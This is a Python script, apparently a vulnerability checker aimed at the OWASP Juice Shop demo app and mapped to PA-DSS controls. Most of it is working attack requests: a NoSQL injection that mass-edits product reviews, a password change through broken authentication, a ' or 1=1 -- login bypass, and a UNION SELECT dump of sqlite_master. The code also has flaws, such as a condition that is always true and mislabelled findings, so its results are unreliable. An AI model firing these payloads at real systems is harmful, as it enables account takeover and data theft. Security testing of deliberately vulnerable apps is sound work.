#! /usr/bin/python3

import pip

def import_or_install(package):
    try:
        __import__(package)
    except ImportError:
        pip.main(['install', package])

import_or_install('requests')
import_or_install('sys')
import_or_install('argparse')
import_or_install('json')

import requests
import sys
import argparse
import json 


parser = argparse.ArgumentParser()
parser.add_argument("-U", "--Url", required=True)
parser.add_argument("-u", "--user", required=True)
parser.add_argument("-p", "--password", required=True)
args = parser.parse_args()

print(f'Hi {args.user} , Welcome ')

# 
# Login
# 

Token = 0

burp1_url = args.Url + "/rest/user/login"
print(f'Login em: ' + burp1_url)
burp1_cookies = {"language": "en", "welcomebanner_status": "dismiss", "cookieconsent_status": "dismiss"}
burp1_headers = {"Connection": "close", "sec-ch-ua": "\";Not A Brand\";v=\"99\", \"Chromium\";v=\"88\"", "Accept": "application/json, text/plain, */*", "sec-ch-ua-mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36", "Content-Type": "application/json", "Origin": "https://" + args.Url, "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://" + args.Url, "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9"}
burp1_json={"email": args.user, "password": args.password }
print(f'Usuário: {args.user} ')
response_login = requests.post(burp1_url, headers=burp1_headers, cookies=burp1_cookies, json=burp1_json)
print("HTTP:" + str(response_login.status_code))

if response_login.status_code == 500 or 400 or 401:
	print("--- Criando usuário ---")
	burp2_url = args.Url + "/api/Users/"
	burp2_cookies = {"language": "en", "welcomebanner_status": "dismiss"}
	burp2_headers = {"Connection": "close", "sec-ch-ua": "\";Not A Brand\";v=\"99\", \"Chromium\";v=\"88\"", "Accept": "application/json, text/plain, */*", "sec-ch-ua-mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36", "Content-Type": "application/json", "Origin": "https://" + args.Url, "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https:/// + args.Url", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9"}
	burp2_json={"email": "getnet@getnet.com.br", "password": "getnetvuln", "passwordRepeat": "getnetvuln", "securityAnswer": "getnet", "securityQuestion": {"createdAt": "2021-03-02T21:27:25.779Z", "id": 11, "question": "Your favorite book?", "updatedAt": "2021-03-02T21:27:25.779Z"}}
	resp = requests.post(burp2_url, headers=burp2_headers, cookies=burp2_cookies, json=burp2_json)
	print("HTTP:" + str(resp.status_code))
	
	if resp.status_code == 400:
		if str(resp.content).find('email must be unique') != -1 :
			print(burp2_url)
			print("--- Vulnerabilidade Enumeração de usuários ---")
			print("--- Falha no controle do PA-DSS:5.2.5 Tratamento incorreto de erros ---")
			print("--- Veja a correção em XXXXXX Proximo da linha XXXXXX ---")
	
	print("--- Fazendo Login ---")

	burp3_url = args.Url + "/rest/user/login"
	burp3_cookies = {"language": "en", "welcomebanner_status": "dismiss", "cookieconsent_status": "dismiss"}
	burp3_headers = {"Connection": "close", "sec-ch-ua": "\";Not A Brand\";v=\"99\", \"Chromium\";v=\"88\"", "Accept": "application/json, text/plain, */*", "sec-ch-ua-mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36", "Content-Type": "application/json", "Origin": "https://" + args.Url, "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https:/// + args.Url", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9"}
	burp3_json = {"email": "getnet@getnet.com.br", "password": "getnetvuln"}
	resp1 = requests.post(burp3_url, headers=burp3_headers, cookies=burp3_cookies, json=burp3_json)

	print("HTTP:" + str(resp1.status_code))
	y = json.loads(resp1.content)
	t = y['authentication']
	tk = t['token']
	
	burp0_url = args.Url + "/rest/products/reviews"
	burp0_cookies = {"language": "en", "welcomebanner_status": "dismiss", "cookieconsent_status": "dismiss", "token": tk}
	burp0_headers = {"Connection": "close", "sec-ch-ua": "\";Not A Brand\";v=\"99\", \"Chromium\";v=\"88\"", "Accept": "application/json, text/plain, */*", "Authorization": "Bearer " +tk, "sec-ch-ua-mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://"+ args.Url, "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9"}
	burp0_json = {"id": {"$ne": -1}, "message": "Teste review"}
	respNoSQl = requests.patch(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json)
	
	print("--- Validando NOsqlInjection ---")
	print("HTTP:" + str(respNoSQl.status_code))
	item_dict = json.loads(respNoSQl.content)
	if item_dict['modified'] >= 20:
		print(burp0_url)
		print("--- Vulnerabilidade a NoSQLInejction ---")
		print("--- Falha no controle do PA-DSS:5.2.1 Falhas na injeção, especialmente na injeção SQL ---")
		print("--- Veja a correção em XXXXXX Proximo da linha XXXXXX ---")


	print("--- Validando Broken Auth e Falha de schema ---")

	burp0_url = args.Url +"/rest/user/change-password?new=getnetvuln&repeat=getnetvuln"
	burp0_cookies = {"language": "pt_BR", "welcomebanner_status": "dismiss", "cookieconsent_status": "dismiss", "continueCode": "kN9xRalwokK68yWeN4JbxOQPrLgAVkTaqdpXBzZq973REvDVMm1Yjn52OMYE", "token": tk}
	burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0", "Accept": "application/json, text/plain, */*", "Accept-Language": "pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Authorization": "Bearer "+tk, "X-User-Email": "bender@juice-sh.op'--", "Connection": "close", "Referer": "http://localhost:3000/"}
	respBH = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
	
	print("HTTP:" + str(respBH.status_code))

	if respBH.status_code == 200 :
		print(burp0_url)
		print("--- Vulnerabilidade a NoSQLInejction ---")
		print("--- Falha no controle do PA-DSS:5.2.8 Controle incorreto de acesso ---")
		print("--- Sua Nova senha é getnetvuln ou Abc123!@# ---")
		print("--- Veja a correção em XXXXXX Proximo da linha XXXXXX ---")

	print("--- Validando SQLInejction Comum ---")

	burp0_url = args.Url + "/rest/user/login"
	burp0_cookies = {"_ga": "GA1.2.1318457424.1613575453", "language": "en", "welcomebanner_status": "dismiss", "cookieconsent_status": "dismiss", "io": "kl59EboSiyaMgz-fAAA7"}
	burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0", "Accept": "application/json, text/plain, */*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/json", "Origin": "https://3000-turquoise-guppy-pznclbe5.ws-us03.gitpod.io", "Connection": "close", "Referer": "https://3000-turquoise-guppy-pznclbe5.ws-us03.gitpod.io/"}
	burp0_json={"email": "' or 1=1 --", "password": "teste"}
	respBH = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json)

	print("HTTP:" + str(respBH.status_code))
	if respBH.status_code == 200 :
		print(burp0_url)
		print("--- Vulneravel a SQLInejction ---")
		print("--- Falha no controle do PA-DSS:5.2.1 Falhas na injeção, especialmente na injeção SQL ---")
		print("--- Veja a correção em XXXXXX Proximo da linha XXXXXX ---")
		y = json.loads(respBH.content)
		t = y['authentication']
		print("Seu e-mail Vulneravel é:"+t['umail'])

	print("--- Validando SQLInejction Comum ---")

	burp0_url = args.Url + "/rest/products/search?q=1%20UNION%20SELECT%20sql%20FROM%20sqlite_master"
	burp0_cookies = {"language": "en", "welcomebanner_status": "dismiss", "cookieconsent_status": "dismiss", "token": tk}
	burp0_headers = {"Connection": "close", "sec-ch-ua": "\";Not A Brand\";v=\"99\", \"Chromium\";v=\"88\"", "sec-ch-ua-mobile": "?0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9"}
	respBH = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)


	if respBH.status_code == 200 :
		print(burp0_url)
		print("--- Vulnerabilidade a NoSQLInejction ---")
		print("--- Falha no controle do PA-DSS:5.2.8 Controle incorreto de acesso ---")
		print("--- Veja a correção em XXXXXX Proximo da linha XXXXXX ---")

	

